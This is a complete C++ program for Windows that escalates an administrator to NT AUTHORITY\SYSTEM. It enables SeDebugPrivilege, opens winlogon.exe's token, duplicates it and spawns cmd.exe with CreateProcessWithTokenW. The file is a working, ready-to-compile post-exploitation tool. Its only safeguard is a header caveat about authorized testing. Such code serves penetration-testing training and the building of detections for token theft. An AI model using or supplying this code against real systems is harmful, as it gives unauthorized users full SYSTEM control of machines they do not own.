#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
.SYNOPSIS
    Token Impersonation: Elevate to NT AUTHORITY\SYSTEM by impersonating a SYSTEM process token.

.DESCRIPTION
    This program demonstrates token impersonation to escalate privileges to SYSTEM level.
    It enables the SeDebugPrivilege to access system processes, finds the winlogon.exe process,
    opens its access token, duplicates it as a primary token, and then uses CreateProcessWithTokenW
    to launch a new process (cmd.exe) running under the NT AUTHORITY\SYSTEM account.

    This technique is commonly used in post-exploitation scenarios for privilege escalation
    when the current user has debug privileges (typically available to administrators).

    Requirements:
      - Administrator privileges to enable SeDebugPrivilege.
      - Target process (e.g., winlogon.exe) must be running as SYSTEM.

.NOTES
    File Name: system_token_impersonation.cpp
    Author   : [Your Name]
    License  : MIT
    Caveats  : Use only in authorized penetration testing or educational contexts.
*/

// Enables the SeDebugPrivilege to allow opening system-level processes.
// This is required to call OpenProcess on protected processes like winlogon.exe.
BOOL EnableDebugPrivilege() {
    HANDLE hToken;

    // Open the current process token with privileges to adjust and query
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    LUID luid;
    // Look up the LUID (Locally Unique Identifier) for the SeDebugPrivilege
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        printf("[-] LookupPrivilegeValue failed. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  // Enable the privilege

    // Adjust the token privileges to include SeDebugPrivilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// Retrieves the Process ID (PID) of a running process by its executable name.
// Uses Toolhelp32 API to enumerate processes.
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process
    if (Process32FirstW(hSnap, &pe)) {
        do {
            // Compare the executable name with the target process name (case-sensitive)
            if (wcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe)); // Continue enumeration
    }
    CloseHandle(hSnap);
    return pid;
}

int main() {
    // Step 1: Enable debug privilege to access system processes
    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Administrator rights required.\n");
        return 1;
    }

    wprintf(L"[*] Finding winlogon.exe...\n");
    DWORD pid = GetProcessIdByName(L"winlogon.exe");
    if (pid == 0) {
        printf("[-] Could not find winlogon.exe process.\n");
        return 1;
    }

    printf("[+] Found winlogon.exe PID: %d\n", pid);

    // Step 2: Open the target process with query rights
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed. Error: %d\n", GetLastError());
        return 1;
    }

    // Step 3: Open the access token of the target process
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        printf("[-] OpenProcessToken failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Step 4: Duplicate the token into a primary token that can be used to start a new process
    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(
        hToken,
        TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hPrimaryToken
    )) {
        printf("[-] DuplicateTokenEx failed. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Step 5: Prepare startup info and command line for the new process
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;
    wchar_t cmdLine[] = L"cmd.exe";  // Command to execute: open a new command prompt

    printf("[+] Launching SYSTEM cmd.exe...\n");

    // Step 6: Create a new process using the duplicated SYSTEM token
    BOOL created = CreateProcessWithTokenW(
        hPrimaryToken,           // Use the duplicated primary token
        0,                       // No additional logon flags
        NULL,                    // Application name inferred from command line
        cmdLine,                 // Command line to execute
        CREATE_NEW_CONSOLE,      // Create a new console window
        NULL,                    // No additional environment
        NULL,                    // Use current directory
        &si,                     // Startup info (window appearance, etc.)
        &pi                      // Receives process and thread handles
    );

    if (!created) {
        printf("[-] CreateProcessWithTokenW failed. Error: %d\n", GetLastError());
    }
    else {
        printf("[+] SYSTEM shell started! PID: %d\n", pi.dwProcessId);

        // Optionally wait for the spawned process to exit before exiting
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Final cleanup: close all open handles
    CloseHandle(hToken);
    CloseHandle(hPrimaryToken);
    CloseHandle(hProcess);

    // Return success or failure based on whether the process was created
    return created ? 0 : 1;
}
